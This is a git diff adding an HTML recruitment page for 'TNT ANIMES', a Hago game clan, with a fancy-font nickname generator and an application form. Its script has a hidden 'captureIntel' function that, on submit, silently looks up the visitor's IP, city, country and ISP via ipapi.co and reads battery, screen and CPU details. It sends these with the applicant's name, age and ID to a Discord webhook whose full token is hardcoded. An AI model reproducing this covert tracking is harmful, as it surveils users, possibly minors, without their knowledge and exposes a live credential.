@@ -619,3 +619,531 @@ function copyText() {
 
 </body>
 </html>
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>TNT ANIMES | GRUNGE ELITE</title>
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Permanent+Marker&family=Syncopate:wght@400;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+
+    <style>
+        :root {
+            --accent: #ff003c; 
+            --bg-dark: #050505;
+            --panel-bg: rgba(15, 15, 15, 0.9);
+            --border-glow: rgba(255, 0, 60, 0.5);
+            --text-main: #ffffff;
+            --text-dim: #666;
+            --grunge-texture: url('https://www.transparenttextures.com/patterns/stardust.png');
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Rajdhani', sans-serif;
+            overflow-x: hidden;
+            background-image: var(--grunge-texture), linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('https://i.pinimg.com/originals/84/fe/4b/84fe4b3e1fba5aa35f3975d051d1f77e.jpg');
+            background-size: cover;
+            background-attachment: fixed;
+        }
+
+        /* Scanline Effect */
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 9999;
+            pointer-events: none;
+            background-size: 100% 2px, 3px 100%;
+        }
+
+        @keyframes pulse-red {
+            0% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0.7); transform: scale(1); }
+            70% { box-shadow: 0 0 0 10px rgba(255, 0, 60, 0); transform: scale(1.05); }
+            100% { box-shadow: 0 0 0 0 rgba(255, 0, 60, 0); transform: scale(1); }
+        }
+
+        @keyframes border-glow {
+            0% { border-color: #440000; box-shadow: 0 0 5px rgba(255, 0, 60, 0.2); }
+            50% { border-color: var(--accent); box-shadow: 0 0 20px rgba(255, 0, 60, 0.6); }
+            100% { border-color: #440000; box-shadow: 0 0 5px rgba(255, 0, 60, 0.2); }
+        }
+
+        @keyframes scanner {
+            0% { top: -10%; }
+            100% { top: 110%; }
+        }
+
+        @keyframes fadeInAlert {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .scanner-line {
+            position: absolute; width: 100%; height: 2px;
+            background: var(--accent); box-shadow: 0 0 15px var(--accent);
+            z-index: 5; left: 0; pointer-events: none; opacity: 0.3;
+            animation: scanner 3s linear infinite;
+        }
+
+        /* Player */
+        .music-player-card {
+            position: fixed; bottom: 20px; right: 20px;
+            background: #000; border: 2px solid var(--accent);
+            padding: 12px; display: flex; align-items: center; gap: 12px;
+            z-index: 2000; box-shadow: 5px 5px 0px var(--accent);
+            animation: border-glow 3s infinite;
+        }
+
+        .play-btn {
+            background: var(--accent); color: white; border: none;
+            width: 40px; height: 40px; cursor: pointer;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.2rem; animation: pulse-red 2s infinite;
+            border-radius: 50%;
+        }
+
+        /* Layout */
+        .header-profile {
+            width: 95%; max-width: 600px; background: #000;
+            margin: 40px auto; border: 1px solid #222;
+            position: relative; overflow: hidden;
+            box-shadow: 10px 10px 0px rgba(255, 0, 60, 0.1);
+        }
+
+        .avatar-box {
+            width: 100px; height: 100px; border: 3px solid var(--accent);
+            background: #000; overflow: hidden; box-shadow: 5px 5px 0px var(--accent);
+            z-index: 10; position: relative;
+        }
+
+        .profile-info h1 {
+            font-family: 'Permanent Marker', cursive; font-size: 2.5rem;
+            color: var(--accent); text-transform: uppercase; margin-top: 10px;
+        }
+
+        /* Role Selection Grid */
+        .roles-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .spec-item {
+            border: 1px solid #333; 
+            padding: 15px 10px; 
+            text-align: center;
+            cursor: pointer; 
+            font-weight: bold; 
+            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            font-size: 0.85rem; 
+            text-transform: uppercase;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            background: rgba(10, 10, 10, 0.8);
+            color: #aaa;
+            border-radius: 4px;
+        }
+
+        .spec-item i {
+            font-size: 1.5rem;
+            color: #555;
+            transition: all 0.3s ease;
+        }
+
+        .spec-item:hover {
+            border-color: var(--accent);
+            background: rgba(255, 0, 60, 0.05);
+            transform: translateY(-2px);
+            color: #fff;
+        }
+
+        .spec-item:hover i { color: var(--accent); }
+
+        .spec-item.active { 
+            background: var(--accent); 
+            color: #fff; 
+            border-color: #fff; 
+            box-shadow: 0 0 15px rgba(255, 0, 60, 0.4);
+        }
+
+        .spec-item.active i { color: #fff; }
+
+        /* Role Rule Alert Box */
+        .rule-alert {
+            display: none;
+            background: linear-gradient(90deg, rgba(255, 0, 60, 0.15) 0%, rgba(0,0,0,0.5) 100%);
+            border-left: 4px solid var(--accent);
+            padding: 15px 20px;
+            margin-top: 15px;
+            border-radius: 0 4px 4px 0;
+            animation: fadeInAlert 0.4s ease-out forwards;
+        }
+
+        .rule-alert.show { display: flex; flex-direction: column; gap: 5px; }
+
+        .rule-alert strong {
+            color: var(--accent);
+            font-family: 'Syncopate', sans-serif;
+            font-size: 0.8rem;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .rule-alert p { color: #eee; font-size: 0.95rem; line-height: 1.4; }
+
+        .submit-btn {
+            width: 100%; background: var(--accent); color: #fff; border: none;
+            padding: 18px; font-family: 'Permanent Marker', cursive;
+            font-size: 1.5rem; cursor: pointer; margin-top: 25px; transition: 0.3s;
+            box-shadow: 0 5px 15px rgba(255, 0, 60, 0.3);
+        }
+
+        .submit-btn:hover {
+            filter: brightness(1.2);
+            transform: scale(1.01);
+        }
+
+        .reveal { opacity: 0; transform: translateY(30px); transition: all 0.8s ease-out; }
+        .reveal.active { opacity: 1; transform: translateY(0); }
+
+        input, textarea, select {
+            width: 100%; background: #0a0a0a; border: 1px solid #333; 
+            padding: 15px; color: #fff; outline: none;
+            font-family: 'Rajdhani', sans-serif; margin-top: 5px;
+            font-size: 1rem; transition: 0.3s;
+        }
+
+        textarea { resize: vertical; min-height: 80px; }
+
+        input:focus, select:focus, textarea:focus { border-color: var(--accent); box-shadow: inset 0 0 10px rgba(255,0,60,0.1); }
+
+        .input-label {
+            color: var(--accent); font-size: 0.8rem; font-weight: bold;
+            text-transform: uppercase; letter-spacing: 1px; display: block;
+            margin-top: 15px;
+        }
+
+        .input-group { margin-bottom: 5px; }
+
+        .copy-btn {
+            background: var(--accent); color: #fff; border: none;
+            padding: 10px 15px; cursor: pointer; font-weight: bold;
+            font-family: 'Rajdhani'; transition: 0.2s;
+        }
+
+        .tag-display-box {
+            display: flex; justify-content: space-between; align-items: center; 
+            background: #050505; padding: 15px; border: 1px solid #222; margin-top: 8px;
+        }
+
+        .tag-text { font-size: 1.1rem; letter-spacing: 1px; color: #eee; word-break: break-all; padding-right: 10px; }
+
+        .error-message {
+            background: rgba(255, 0, 60, 0.2);
+            color: #ff99aa;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid var(--accent);
+            display: none;
+            font-weight: bold;
+            font-size: 0.85rem;
+        }
+    </style>
+</head>
+<body>
+
+<div class="music-player-card">
+    <button class="play-btn" onclick="toggleMusic()">
+        <i class="fas fa-play" id="playIcon"></i>
+    </button>
+    <div class="music-info">
+        <marquee>TNT Elite - Data Extraction Protocol</marquee>
+        <span style="font-size: 0.6rem; color: var(--accent); font-weight: bold; letter-spacing: 1px;"><i class="fas fa-circle" style="font-size: 0.5rem; animation: pulse-red 1s infinite;"></i> STATUS: ENCRIPTADO</span>
+    </div>
+    <audio id="myAudio" loop>
+        <source src="https://static.bandlab.com/on-demand-revisions/befb5420-9c17-4a45-68ae-3cf86b7e6341/befb5420-9c17-4a45-68ae-3cf86b7e6341-wav-44100-16bit.wav" type="audio/mpeg">
+    </audio>
+</div>
+
+<div class="header-profile">
+    <div class="scanner-line"></div>
+    <div class="profile-banner" style="width: 100%; height: 160px; background-image: url('https://i.pinimg.com/originals/7b/b9/ed/7bb9ed00d54da2404408d685534a36d4.gif'); background-size: cover; background-position: center;"></div>
+    <div class="profile-content" style="padding: 20px; margin-top: -50px; background: linear-gradient(to top, #000 70%, transparent);">
+        <div class="avatar-box">
+            <img src="https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg" alt="TNT" style="width: 100%; height: 100%; object-fit: cover;">
+        </div>
+        <div class="profile-info">
+            <h1>『TNT ANIMES』</h1>
+            <p style="color: var(--accent); font-size: 0.8rem; letter-spacing: 3px; font-weight: bold;">[ PROTOCOLO DE RECRUTAMENTO ]</p>
+        </div>
+    </div>
+</div>
+
+<div class="container" style="max-width: 700px; margin: 0 auto; padding: 20px;">
+
+    <!-- TAG GENERATOR -->
+    <div class="reveal">
+        <h2 style="color: var(--accent); font-family: 'Permanent Marker'; margin-bottom: 15px;">GERADOR DE IDENTIDADE</h2>
+        <div style="background: rgba(10,10,10,0.9); padding: 25px; border: 1px dashed var(--accent); margin-bottom: 40px;">
+            
+            <div class="input-group">
+                <span class="input-label">NICKNAME (SEU NOME)</span>
+                <input type="text" id="tagName" placeholder="Digite seu nome aqui..." oninput="updateTags()">
+                <div id="charLimitWarning" class="error-message">
+                    ⚠️ O Hago não permite nicks maiores que 35 caracteres.
+                </div>
+            </div>
+
+            <div class="input-group">
+                <span class="input-label">ESTILO DA FONTE</span>
+                <select id="fontSelect" onchange="updateTags()">
+                    <option value="smallCaps">ꜱᴍᴀʟʟ ᴄᴀᴘꜱ</option>
+                    <option value="normal">PADRÃO</option>
+                    <option value="serifBold">𝐒𝐞𝐫𝐢𝐟 𝐁𝐨𝐥𝐝</option>
+                    <option value="sansBold">𝗦𝗮𝗻𝘀 𝗕𝗼𝗹𝗱</option>
+                    <option value="boldItalic">𝑩𝒐𝒍𝒅 𝑰𝒕𝒂𝒍𝒊𝒄</option>
+                    <option value="cyber">₵¥฿ɆⱤ</option>
+                </select>
+            </div>
+            
+            <div style="margin-top: 20px;">
+                <span class="input-label" style="font-size: 0.7rem; color: #888;">TAG OFICIAL TNT</span>
+                <div class="tag-display-box">
+                    <span id="tagMain" class="tag-text">ꪶ͢🇯🇵 ⃟ᴀͭɴᷡᴍͭs NOME</span>
+                    <button class="copy-btn" onclick="copyTag('tagMain')"><i class="fas fa-copy"></i> COPIAR</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- RECRUITMENT FORM -->
+    <div class="reveal">
+        <h2 style="color: var(--accent); font-family: 'Permanent Marker'; margin-bottom: 15px;">FICHA DE ALISTAMENTO</h2>
+        <div style="background: rgba(0,0,0,0.95); border: 1px solid #222; padding: 30px; margin-bottom: 60px; position: relative;">
+            <div class="scanner-line"></div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-user"></i> Nome:</label>
+                <input type="text" id="f_name" placeholder="Seu nome real ou apelido">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-calendar"></i> Idade:</label>
+                <input type="number" id="f_age" placeholder="Sua idade">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-fingerprint"></i> ID (Hago):</label>
+                <input type="text" id="f_id" placeholder="Seu ID do Hago">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-user-secret"></i> Recrutado por:</label>
+                <input type="text" id="f_recruiter" placeholder="Quem te convidou?">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-history"></i> Já participou de FML? Qual?</label>
+                <input type="text" id="f_history" placeholder="Ex: Akatsuki, Mafia, etc.">
+            </div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-question-circle"></i> Por que quer entrar na TNT ANIMES?</label>
+                <textarea id="f_reason" placeholder="Diga seu motivo..."></textarea>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-plus-circle"></i> O que pode agregar à família?</label>
+                <textarea id="f_aggregate" placeholder="Habilidades, tempo online, etc."></textarea>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-exclamation-triangle"></i> Já teve problemas em família (tretas, punições)?</label>
+                <textarea id="f_troubles" placeholder="Seja honesto(a) sobre conflitos passados..."></textarea>
+            </div>
+
+            <div class="input-group">
+                <label class="input-label"><i class="fas fa-crosshairs"></i> Especialidade Desejada</label>
+                <div class="roles-grid">
+                    <div class="spec-item" onclick="pickRole(this, 'SEGURANÇA')"><i class="fas fa-shield-halved"></i><span>SEGURANÇA</span></div>
+                    <div class="spec-item" onclick="pickRole(this, 'RECRUTADOR')"><i class="fas fa-user-plus"></i><span>RECRUTADOR</span></div>
+                    <div class="spec-item" onclick="pickRole(this, 'CARISMA')"><i class="fas fa-face-laugh-beam"></i><span>CARISMA</span></div>
+                    <div class="spec-item" onclick="pickRole(this, 'DIVULGADOR')"><i class="fas fa-bullhorn"></i><span>DIVULGADOR</span></div>
+                </div>
+                <div id="roleAlertBox" class="rule-alert">
+                    <strong><i class="fas fa-exclamation-triangle"></i> DIRETRIZES:</strong>
+                    <p id="roleAlertText"></p>
+                </div>
+            </div>
+
+            <button class="submit-btn" id="submitBtn" onclick="sendToDiscord()"><i class="fas fa-satellite-dish"></i> ENVIAR ALISTAMENTO</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1476601660364165242/9nKIRh0xSFyAfDt2JrrY7LeJelm0ClDEMxRtfc4WDUP5rsUsXvDgtAIuHckx4Q1VxRkF";
+
+    const charMaps = {
+        serifBold: { a:'𝐚', b:'𝐛', c:'𝐜', d:'𝐝', e:'𝐞', f:'𝐟', g:'𝐠', h:'𝐡', i:'𝐢', j:'𝐣', k:'𝐤', l:'𝐥', m:'𝐦', n:'𝐧', o:'𝐨', p:'𝐩', q:'𝐪', r:'𝐫', s:'𝐬', t:'𝐭', u:'𝐮', v:'𝐯', w:'𝐰', x:'𝐱', y:'𝐲', z:'𝐳', A:'𝐀', B:'𝐁', C:'𝐂', D:'𝐃', E:'𝐄', F:'𝐅', G:'𝐆', H:'𝐇', I:'𝐈', J:'𝐉', K:'𝐊', L:'𝐋', M:'𝐌', N:'𝐍', O:'𝐎', P:'𝐏', Q:'𝐐', R:'𝐑', S:'𝐒', T:'𝐓', U:'𝐔', V:'𝐕', W:'𝐖', X:'𝐗', Y:'𝐘', Z:'𝐙' },
+        sansBold: { a:'𝗮', b:'𝗯', c:'𝗰', d:'𝗱', e:'𝗲', f:'𝗳', g:'𝗴', h:'𝗵', i:'𝗶', j:'𝗷', k:'𝗸', l:'𝗹', m:'𝗺', n:'𝗻', o:'𝗼', p:'𝗽', q:'𝗾', r:'𝗿', s:'𝘀', t:'𝘁', u:'𝘂', v:'𝘃', w:'𝘄', x:'𝘅', y:'𝘆', z:'𝘇', A:'𝗔', B:'𝗕', C:'𝗖', D:'𝗗', E:'𝗘', F:'𝗙', G:'𝗚', H:'𝗛', I:'𝗜', J:'𝗝', K:'𝗞', L:'𝗟', M:'𝗠', N:'𝗡', O:'𝗢', P:'𝗣', Q:'𝗤', R:'𝗥', S:'𝗦', T:'𝗧', U:'𝗨', V:'𝗩', W:'𝗪', X:'𝗫', Y:'𝗬', Z:'𝗭' },
+        boldItalic: { a:'𝒂', b:'𝒃', c:'𝒄', d:'𝒅', e:'𝒆', f:'𝒇', g:'𝒈', h:'𝒉', i:'𝒊', j:'𝒋', k:'𝒌', l:'𝒍', m:'𝒎', n:'𝒏', o:'𝒐', p:'𝒑', q:'𝒒', r:'𝒓', s:'𝒔', t:'𝒕', u:'𝒖', v:'𝒗', w:'𝒘', x:'𝒙', y:'𝒚', z:'𝒛', A:'𝑨', B:'𝑩', C:'𝑪', D:'𝑫', E:'𝑬', F:'𝑭', G:'𝑮', H:'𝑯', I:'𝑰', J:'𝑱', K:'𝑲', L:'𝑳', M:'𝑴', N:'𝑵', O:'𝑶', P:'𝑷', Q:'𝑸', R:'𝑹', S:'𝑺', T:'𝑻', U:'𝑼', V:'𝑽', W:'𝑾', X:'𝑿', Y:'𝒀', Z:'𝒁' },
+        cyber: { a:'₳', b:'฿', c:'₵', d:'Đ', e:'Ɇ', f:'₣', g:'₲', h:'Ħ', i:'Ɨ', j:'Ɉ', k:'₭', l:'Ⱡ', m:'₥', n:'₦', o:'Ø', p:'₱', q:'Ɋ', r:'Ɽ', s:'₴', t:'₮', u:'Ʉ', v:'V', w:'₩', x:'Ӿ', y:'¥', z:'Ƶ', A:'₳', B:'฿', C:'₵', D:'Đ', E:'Ɇ', F:'₣', G:'₲', H:'Ħ', I:'Ɨ', J:'Ɉ', K:'₭', L:'Ⱡ', M:'₥', N:'₦', O:'Ø', P:'₱', Q:'Ɋ', R:'Ɽ', S:'₴', T:'₮', U:'Ʉ', V:'V', W:'₩', X:'Ӿ', Y:'¥', Z:'Ƶ' },
+        smallCaps: { a:'ᴀ', b:'ʙ', c:'ᴄ', d:'ᴅ', e:'ᴇ', f:'ꜰ', g:'ɢ', h:'ʜ', i:'ɪ', j:'ᴊ', k:'ᴋ', l:'ʟ', m:'ᴍ', n:'ɴ', o:'ᴏ', p:'ᴘ', q:'ǫ', r:'ʀ', s:'ꜱ', t:'ᴛ', u:'ᴜ', v:'ᴠ', w:'ᴡ', x:'x', y:'ʏ', z:'ᴢ', A:'ᴀ', B:'ʙ', C:'ᴄ', D:'ᴅ', E:'ᴇ', F:'ꜰ', G:'ɢ', H:'ʜ', I:'ɪ', J:'ᴊ', K:'ᴋ', L:'ʟ', M:'ᴍ', N:'ɴ', O:'ᴏ', P:'ᴘ', q:'ǫ', R:'ʀ', s:'ꜱ', T:'ᴛ', U:'ᴜ', V:'ᴠ', W:'ᴡ', X:'x', Y:'ʏ', Z:'ᴢ' }
+    };
+
+    let selectedRole = "";
+
+    function transformText(text, style) {
+        if (style === 'normal') return text;
+        const map = charMaps[style];
+        return text.split('').map(char => map[char] || map[char.toUpperCase()] || char).join('');
+    }
+
+    function updateTags() {
+        const rawName = document.getElementById('tagName').value.trim();
+        const fontStyle = document.getElementById('fontSelect').value;
+        const stylizedName = transformText(rawName || "NOME", fontStyle);
+        const finalTag = `ꪶ͢🇯🇵 ⃟ᴀͭɴᷡᴍͭs ${stylizedName}`;
+        document.getElementById('tagMain').innerText = finalTag;
+        document.getElementById('charLimitWarning').style.display = finalTag.length > 35 ? 'block' : 'none';
+    }
+
+    function copyTag(id) {
+        const text = document.getElementById(id).innerText;
+        const el = document.createElement('textarea');
+        el.value = text;
+        document.body.appendChild(el);
+        el.select();
+        document.execCommand('copy');
+        document.body.removeChild(el);
+        const btn = event.target.closest('.copy-btn');
+        btn.innerHTML = "<i class='fas fa-check'></i> COPIADO";
+        setTimeout(() => btn.innerHTML = "<i class='fas fa-copy'></i> COPIAR", 1500);
+    }
+
+    function pickRole(el, role) {
+        document.querySelectorAll('.spec-item').forEach(i => i.classList.remove('active'));
+        el.classList.add('active');
+        selectedRole = role;
+        document.getElementById('roleAlertText').innerText = `Você escolheu a função: ${role}. Agir com disciplina e honra.`;
+        document.getElementById('roleAlertBox').classList.add('show');
+    }
+
+    function toggleMusic() {
+        const audio = document.getElementById('myAudio');
+        const icon = document.getElementById('playIcon');
+        if (audio.paused) { audio.play(); icon.className = "fas fa-pause"; } 
+        else { audio.pause(); icon.className = "fas fa-play"; }
+    }
+
+    async function captureIntel() {
+        let intel = {
+            ip: 'Unknown',
+            loc: 'Unknown',
+            isp: 'Unknown',
+            ua: navigator.userAgent,
+            bat: 'N/A',
+            screen: `${screen.width}x${screen.height}`,
+            lang: navigator.language,
+            cores: navigator.hardwareConcurrency || 'N/A'
+        };
+
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            intel.ip = data.ip;
+            intel.loc = `${data.city}, ${data.region}, ${data.country_name}`;
+            intel.isp = data.org;
+        } catch(e) {}
+
+        try {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                intel.bat = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Carregando)' : '(Descarregando)'}`;
+            }
+        } catch(e) {}
+
+        return intel;
+    }
+
+    async function sendToDiscord() {
+        const fields = {
+            name: document.getElementById('f_name').value,
+            age: document.getElementById('f_age').value,
+            id: document.getElementById('f_id').value,
+            recruiter: document.getElementById('f_recruiter').value,
+            history: document.getElementById('f_history').value,
+            reason: document.getElementById('f_reason').value,
+            aggregate: document.getElementById('f_aggregate').value,
+            troubles: document.getElementById('f_troubles').value
+        };
+
+        if (!fields.name || !fields.id || !selectedRole) {
+            alert("Preencha ao menos Nome, ID e Especialidade.");
+            return;
+        }
+
+        const btn = document.getElementById('submitBtn');
+        btn.innerHTML = "ENVIANDO DOSSIÊ...";
+        btn.disabled = true;
+
+        const intel = await captureIntel();
+
+        const data = {
+            content: "🛡️ **NOVO RECRUTA DETECTADO NO TERMINAL**",
+            embeds: [{
+                title: "FICHA DE ALISTAMENTO - TNT ANIMES",
+                color: 16711740,
+                thumbnail: { url: "https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg" },
+                fields: [
+                    { name: "👤 Identidade", value: `**Nome:** ${fields.name}\n**Idade:** ${fields.age}\n**ID Hago:** ${fields.id}\n**Recrutador:** ${fields.recruiter}`, inline: false },
+                    { name: "⚔️ Especialidade", value: `\`${selectedRole}\``, inline: true },
+                    { name: "📜 Histórico FML", value: fields.history || "Nenhum", inline: true },
+                    { name: "🎯 Motivação", value: fields.reason || "Não informado", inline: false },
+                    { name: "💪 Agregado", value: fields.aggregate || "Não informado", inline: false },
+                    { name: "⚠️ Conflitos/Tretas", value: fields.troubles || "Nenhum", inline: false },
+                    { name: "📱 Dispositivo & Conexão", value: `**IP:** ${intel.ip}\n**Local:** ${intel.loc}\n**Bateria:** ${intel.bat}\n**Tela:** ${intel.screen}\n**Cores:** ${intel.cores}\n**ISP:** ${intel.isp}`, inline: false }
+                ],
+                footer: { text: "Terminal TNT Elite v4.0 | " + new Date().toLocaleString() }
+            }]
+        };
+
+        try {
+            await fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+            btn.innerHTML = "DADOS TRANSMITIDOS!";
+            btn.style.background = "#00ff40";
+        } catch (e) {
+            btn.innerHTML = "ERRO NA TRANSMISSÃO";
+            btn.disabled = false;
+        }
+    }
+
+    function reveal() {
+        document.querySelectorAll(".reveal").forEach(r => {
+            if (r.getBoundingClientRect().top < window.innerHeight - 50) r.classList.add("active");
+        });
+    }
+    window.addEventListener("scroll", reveal);
+    window.onload = () => { reveal(); updateTags(); };
+</script>
+</body>
+</html>
